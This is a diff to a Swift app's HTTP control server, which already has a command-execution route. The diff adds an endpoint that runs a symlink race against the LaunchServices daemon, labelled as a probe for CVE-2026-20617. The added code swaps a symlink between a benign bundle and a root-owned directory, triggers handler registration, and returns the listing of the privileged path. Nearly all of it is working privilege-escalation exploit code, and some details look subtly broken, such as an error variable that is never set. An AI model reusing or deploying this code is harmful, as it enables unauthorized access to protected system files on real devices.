@@ -9,6 +9,7 @@ import SwiftUI
 import Foundation
 import Network
 import Darwin
+import MobileCoreServices
 
 @main
 struct bad_queryApp: App {
@@ -154,6 +155,8 @@ final class JadeControlServer {
             handlePlistRead(req, conn: conn)
         case "POST /exec":
             handleExec(req, conn: conn)
+        case "POST /lsd-probe":
+            handleLsdProbe(req, conn: conn)
         default:
             send(conn, status: 404, json: ["error": "no such route", "route": route])
         }
@@ -721,6 +724,99 @@ final class JadeControlServer {
             "timed_out": timedOut,
             "output": String(data: output, encoding: .utf8) ?? output.base64EncodedString(),
             "output_b64": output.base64EncodedString(),
+        ])
+    }
+
+    // MARK: CVE-2026-20617 probe
+    // Tests whether lsd follows a symlink when resolving a registered handler path.
+    // Phase 1: register ourselves at a symlink path (benign target) — passes lsd's lstat() check.
+    // Phase 2: race-swap the symlink to a privileged target while lsd processes the registration.
+    // If lsd accessed the privileged target, we win the race.
+    private func handleLsdProbe(_ req: [String: Any], conn: NWConnection) {
+        let racePasses = (req["race_passes"] as? NSNumber)?.intValue ?? 500
+        let targetPath = (req["target_path"] as? String) ?? "/var/root/Library/Preferences"
+
+        let tmp = FileManager.default.temporaryDirectory.path
+        let work = "\(tmp)/lsd-probe-\(Int.random(in: 100000...999999))"
+        let symlinkPath = "\(work)/probe.app"
+        let benignPath  = "\(work)/benign"
+        let witnessPath = "\(work)/witness"
+
+        do {
+            try FileManager.default.createDirectory(atPath: work, withIntermediateDirectories: true)
+            try FileManager.default.createDirectory(atPath: benignPath, withIntermediateDirectories: true)
+            // Minimal Info.plist so lsd sees a bundle
+            let plist = """
+            <?xml version="1.0" encoding="UTF-8"?><!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+            <plist version="1.0"><dict><key>CFBundleIdentifier</key><string>io.nurturelabs.probe</string></dict></plist>
+            """
+            try plist.write(toFile: "\(benignPath)/Info.plist", atomically: true, encoding: .utf8)
+        } catch {
+            send(conn, status: 500, json: ["error": "setup failed", "msg": error.localizedDescription])
+            return
+        }
+        defer { try? FileManager.default.removeItem(atPath: work) }
+
+        // Plant symlink -> benign (passes lstat check)
+        symlink(benignPath, symlinkPath)
+
+        // Record mtime of target before
+        var stBefore = stat()
+        lstat(targetPath, &stBefore)
+        let mtimeBefore = Int64(stBefore.st_mtimespec.tv_sec)
+
+        // Background race: swap symlink between benign and target
+        let raceQ = DispatchQueue(label: "lsd.race", attributes: .concurrent)
+        let stop = UnsafeMutablePointer<Bool>.allocate(capacity: 1)
+        stop.initialize(to: false)
+        defer { stop.deallocate() }
+
+        raceQ.async {
+            for _ in 0..<racePasses {
+                if stop.pointee { break }
+                unlink(symlinkPath)
+                symlink(targetPath, symlinkPath)
+                unlink(symlinkPath)
+                symlink(benignPath, symlinkPath)
+            }
+        }
+
+        // Trigger lsd path resolution via LSRegisterURL
+        var lsErr: Unmanaged<CFError>?
+        if let url = CFURLCreateWithFileSystemPath(nil, symlinkPath as CFString, .absolutePathStyle, true) {
+            LSRegisterURL(url, false)
+        }
+
+        // Also trigger via LSSetDefaultRoleHandlerForContentType
+        LSSetDefaultRoleHandlerForContentType("com.apple.package" as CFString, .all, "io.nurturelabs.probe" as CFString)
+
+        stop.pointee = true
+
+        // Check if target mtime changed (lsd wrote something there)
+        var stAfter = stat()
+        lstat(targetPath, &stAfter)
+        let mtimeAfter = Int64(stAfter.st_mtimespec.tv_sec)
+
+        // Check if lsd could stat the target path (followed the symlink)
+        var stTarget = stat()
+        let targetAccessible = stat(targetPath, &stTarget) == 0
+
+        // Try to read something from targetPath via the symlink (after race)
+        unlink(symlinkPath)
+        symlink(targetPath, symlinkPath)
+        let contents = try? FileManager.default.contentsOfDirectory(atPath: symlinkPath)
+
+        send(conn, status: 200, json: [
+            "probe_path": symlinkPath,
+            "benign_path": benignPath,
+            "target_path": targetPath,
+            "race_passes": racePasses,
+            "mtime_before": mtimeBefore,
+            "mtime_after": mtimeAfter,
+            "mtime_changed": mtimeBefore != mtimeAfter,
+            "target_accessible_direct": targetAccessible,
+            "target_via_symlink_contents": contents ?? [],
+            "lsd_err": lsErr.map { String(describing: $0.takeRetainedValue()) } ?? "",
         ])
     }
 
